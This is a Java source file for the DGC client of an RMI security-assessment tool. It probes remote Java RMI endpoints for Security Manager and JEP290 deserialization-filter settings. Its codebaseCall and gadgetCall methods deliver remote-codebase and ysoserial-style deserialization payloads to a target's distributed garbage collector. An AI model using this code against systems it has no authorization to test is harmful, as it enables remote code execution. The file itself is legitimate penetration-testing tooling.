package de.qtc.rmg.operations;

import java.rmi.server.ObjID;
import java.util.HashMap;

import de.qtc.rmg.internal.ExceptionHandler;
import de.qtc.rmg.internal.MethodArguments;
import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.RMIEndpoint;
import de.qtc.rmg.utils.DefinitelyNonExistingClass;

/**
 * The distributed garbage collector (DGC) is a well known RMI object with publicly known method definitions.
 * In the early days of RMI, the DGC was the prime target for attackers and most attacks like codebase
 * or deserialization exploits targeted methods exposed by the DGC.
 *
 * Today, the DGC is probably one of the most locked down RMI interfaces. It implements a very strict
 * deserialization filter for incoming and outgoing calls, enables useCodebaseOnly internally, which overwrites
 * the user settings and uses a separate AccessControlContext that denies basically everything apart from accepting
 * connections.
 *
 * Nonetheless, it is may desired to test DGC protections during security assessments to identify vulnerabilities
 * on outdated RMI endpoints or custom implementations. Therefore, DGC support was also implemented for rmg.
 *
 * @author Tobias Neitzel (@qtc_de)
 */
public class DGCClient {

    private RMIEndpoint rmi;

    private static final long interfaceHash = -669196253586618813L;
    private static final ObjID objID = new ObjID(ObjID.DGC_ID);

    public DGCClient(RMIEndpoint rmiEndpoint)
    {
        this.rmi = rmiEndpoint;
    }

    /**
     * The enumSecurityManager uses the DGC endpoint to check for an Security Manager. It does so by sending a class
     * unknown to the remote server within a DGC call. If the server runs without a Security Manager, it will reject
     * class loading and inform the caller about the missing Security Manager within the raised exception.
     *
     * If a Security Manager is in use, the DGC should raise an UnmarshalException that contains the ClassNotFoundException
     * as it's cause. During the RMI call, the enumSecurityManager function sets an invalid URL as client side codebase.
     * However, modern DGC implementations set useCodebaseOnly to false internally and do not respect user defined
     * settings for this property. Remote class loading is therefore always disabled on modern DGC endpoints. Getting
     * an UnmarshalException containing a plain ClassNotFoundException is therefore the most common behavior when a Security
     * Manager is in use.
     *
     * If the remote server specifies a codebase value on it's own, we may also encounter a ClassNotFoundException that
     * contains 'access to class loader denied' within the Exception text. This is caused by the separate AccessControlContext
     * that is used by the DGC. Since the codebase is defined by the server itself, useCodebaseOnly=true does not matter here
     * and the DGC attempts to load the unknown class from the server specified codebase. However, due to the separate and
     * more restrictive AccessControlContext, the Security Manager prevents the DGC from accessing the locally defined
     * codebase. Therefore, this behavior is expected for RMI servers that use a Security Manager and set an RMI codebase
     * locally.
     *
     * On really old RMI servers you may also obtain a MalformedURLException. This indicates that the server uses a
     * Security Manager and that useCodebaseOnly is set to false. Since useCodebaseOnly is set to false automatically
     * for modern DGC implementations, this always indicates that server is outdated. Furthermore, it may be possible
     * to perform remote class loading attacks on it.
     *
     * @param callName DGC call to use for the enumeration
     */
    public void enumSecurityManager(String callName)
    {
        try {
            Logger.printlnBlue("RMI Security Manager enumeration:");
            Logger.lineBreak();
            Logger.increaseIndent();

            MaliciousOutputStream.setDefaultLocation("InvalidURL");
            dgcCall(callName, packArgsByName(callName, new DefinitelyNonExistingClass()), true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = ExceptionHandler.getCause(e);
            Throwable c = ExceptionHandler.getThrowable("ClassNotFoundException", e);

            if( c != null ) {

                if( c.getMessage().contains("no security manager: RMI class loader disabled") ) {
                    Logger.printlnMixedYellow("- Caught Exception containing", "'no security manager'", "during RMI call.");
                    Logger.printlnMixedYellow("  --> The server", "does not", "use a Security Manager.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().contains("access to class loader denied") ) {
                    Logger.printlnMixedYellow("- Security Manager", "rejected access", "to the class loader.");
                    Logger.printlnMixedBlue("  --> The server", "does use", "a Security Manager.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else if( c.getMessage().equals("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                    Logger.printlnMixedYellow("- RMI server", "did not", "attempt to parse the supplied codebase.");
                    Logger.printlnMixedBlue("  --> The server", "does use", "a Security Manager.");
                    Logger.statusDefault();
                    ExceptionHandler.showStackTrace(e);

                } else {
                    ExceptionHandler.unexpectedException(e, "Security Manager", "enumeration", false);
                }

            } else if( t instanceof java.net.MalformedURLException) {
                Logger.printlnMixedYellow("- Caught", "MalformedURLException", "during " + callName + " call.");
                Logger.printMixedBlue("  --> Security Manager is", "enabled", "and ");
                Logger.printlnPlainYellow("useCodebaseOnly=false.");
                Logger.statusNonDefault();
                ExceptionHandler.showStackTrace(e);

            } else if( t instanceof java.lang.UnsupportedOperationException) {
                ExceptionHandler.unsupportedOperationExceptionEnum(e, callName);

            } else {
                ExceptionHandler.unexpectedException(e, "Security Manager", "enumeration", false);
            }

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "Security Manager", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
            MaliciousOutputStream.resetDefaultLocation();
        }
    }

    /**
     * Checks for deserialization filters on the DGC endpoint. This is pretty straight forward. Just sends a
     * java.util.HashMap during a DGC call and checks whether the class is rejected.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     */
    public void enumJEP290(String callName)
    {
        try {
            Logger.printlnBlue("RMI server JEP290 enumeration:");
            Logger.lineBreak();
            Logger.increaseIndent();

            dgcCall(callName, packArgsByName(callName, new HashMap<String,String>()), false);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is installed).");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
                Logger.printPlainBlue(" java.util.HashMap");
                Logger.printlnPlainYellow(" (JEP290 is not installed).");
                Logger.statusVulnerable();
                ExceptionHandler.showStackTrace(e);

            } else if( cause instanceof java.lang.UnsupportedOperationException) {
                Logger.printMixedYellow("- DGC", "rejected", "deserialization with an");
                Logger.printlnPlainBlue("UnsupportedOperationException (NotSoSerial?)");
                Logger.statusOk();
                ExceptionHandler.showStackTrace(e);

            } else {
                ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);
            }

        } catch( java.lang.ClassCastException e ) {
            Logger.printMixedYellow("- DGC", "accepted", "deserialization of");
            Logger.printPlainBlue(" java.util.HashMap");
            Logger.printlnPlainYellow(" (JEP290 is not installed).");
            Logger.statusVulnerable();
            ExceptionHandler.showStackTrace(e);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, "JEP290", "enumeration", false);

        } finally {
            Logger.decreaseIndent();
        }
    }

    /**
     * Invokes a DGC method with a user controlled codebase as class annotation. The codebase is already set
     * by the ArgumentParser during the startup of the program. This method was never successfully tested, as
     * it is difficult to find a Java version that is still vulnerable to this :D
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param payloadObject object to use during the codebase call
     */
    public void codebaseCall(String callName, Object payloadObject)
    {
        String className = payloadObject.getClass().getName();
        Logger.printCodebaseAttackIntro("DGC", callName, className);

        try {
            dgcCall(callName, packArgsByName(callName, payloadObject), true);

        } catch( java.rmi.ServerException e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC");

            } else if( cause instanceof java.lang.UnsupportedOperationException ) {
                ExceptionHandler.unsupportedOperationException(e, callName);

            } else if( cause instanceof java.lang.ClassFormatError || cause instanceof java.lang.UnsupportedClassVersionError) {
                ExceptionHandler.unsupportedClassVersion(e, callName, "call");

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains("RMI class loader disabled") ) {
                ExceptionHandler.codebaseSecurityManager(e);

            } else if( cause instanceof java.lang.ClassNotFoundException && cause.getMessage().contains(className)) {
                ExceptionHandler.codebaseClassNotFound(e, className);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.codebaseClassCast(e, false);

            } else if( cause instanceof java.security.AccessControlException) {
                ExceptionHandler.accessControl(e, callName, "call");

            } else {
                ExceptionHandler.unexpectedException(e, callName, "call", false);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.codebaseClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, callName, "call", false);
        }
    }

    /**
     * Invokes a DGC call with a user controlled payload object (usually a gadget created by ysoserial).
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param payloadObject object to use during the DGC call
     */
    public void gadgetCall(String callName, Object payloadObject)
    {
        Logger.printGadgetCallIntro("DGC");

        try {
            dgcCall(callName, packArgsByName(callName, payloadObject), false);

        } catch( java.rmi.ServerException | java.rmi.ServerError e ) {

            Throwable cause = ExceptionHandler.getCause(e);

            if( cause instanceof java.io.InvalidClassException ) {
                ExceptionHandler.invalidClass(e, "DGC");

            } else if( cause instanceof java.lang.UnsupportedOperationException ) {
                ExceptionHandler.unsupportedOperationException(e, callName);

            } else if( cause instanceof java.lang.ClassNotFoundException) {
                ExceptionHandler.deserializeClassNotFound(e);

            } else if( cause instanceof java.lang.ClassCastException) {
                ExceptionHandler.deserlializeClassCast(e, false);

            } else {
                ExceptionHandler.unknownDeserializationException(e);
            }

        } catch( java.lang.ClassCastException e ) {
            ExceptionHandler.deserlializeClassCast(e, false);

        } catch( Exception e ) {
            ExceptionHandler.unexpectedException(e, callName, "call", false);
        }
    }

    /**
     * DGC calls are implemented by using the genericCall function of the RMIEndpoint class. This allows to dispatch raw RMI
     * calls with fine granular control of the call parameters. The DGC interface on the server side is implemented
     * by using a skeleton, that still uses the old RMI calling convetion. Therefore, we have to use an interfaceHash
     * instead of method hashes and need to specify the call number as callID. The callID can be looked up
     * by name using the helper function defined below.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param callArguments the arguments to use during the call
     * @param maliciousStream whether to use the MaliciousOutputStream, required for custom codebase values
     * @throws Exception all connection related exceptions are caught, but anything other is thrown
     */
    private void dgcCall(String callName, MethodArguments callArguments, boolean maliciousStream) throws Exception
    {
        try {
            rmi.genericCall(objID, getCallByName(callName), interfaceHash, callArguments, maliciousStream, callName);

        } catch( java.rmi.NoSuchObjectException e ) {
            ExceptionHandler.noSuchObjectException(e, "DGC", false);
        }
    }

    /**
     * Looks up the callID for the specified DGC call. DGC endpoints only support the methods clean and dirty.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @return callID for the corresponding call
     */
    private int getCallByName(String callName)
    {
        switch(callName) {
            case "clean":
                return 0;
            case "dirty":
                return 1;
            default:
                ExceptionHandler.internalError("DGCClient.getCallIDByName", "Unable to find callID for method '" + callName + "'.");
        }

        return 0;
    }

    /**
     * Depending on the desired DGC call, the structure of the input arguments has to be different. This function
     * builds the argument array according to the specified DGC call. The user specified payload object is inserted
     * at a location that is deserialized by readObject.
     *
     * @param callName the DGC call to use for the operation (clean|dirty)
     * @param payloadObject object to use during the DGC call
     * @return MethodArguments that can be used for the corresponding call
     */
    private MethodArguments packArgsByName(String callName, Object payloadObject)
    {
        MethodArguments callArguments = new MethodArguments(4);

        switch(callName) {
            case "clean":
                callArguments.add(new ObjID[]{}, Object.class);
                callArguments.add(0L, long.class);
                callArguments.add(payloadObject, Object.class);
                callArguments.add(true, boolean.class);
                break;
            case "dirty":

                callArguments.add(new ObjID[]{}, Object.class);
                callArguments.add(0L, long.class);
                callArguments.add(payloadObject, Object.class);
                break;

            default:
                ExceptionHandler.internalError("DGCClient.packArgsByName", "Unable to find pack strategy for method '" + callName + "'.");
        }

        return callArguments;
    }
}
